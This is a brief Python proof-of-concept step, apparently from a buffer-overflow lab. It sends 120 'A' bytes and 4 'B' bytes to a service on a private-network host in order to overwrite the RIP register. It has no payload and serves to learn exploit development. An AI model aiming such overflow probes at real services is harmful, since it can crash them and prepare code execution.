#!/usr/bin/python
import socket

# Part 4 of proof of concept by Vry4n
# This script is intended to fill the buffer with As and RIP with Bs 

FUZZ = 'A' * 120
RIP = "B" * 4

print("Fuzzing with {} bytes".format(len(FUZZ)))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(("192.168.0.13", 31337))
s.recv(1024)
s.send(FUZZ.encode() + RIP.encode())
s.close()
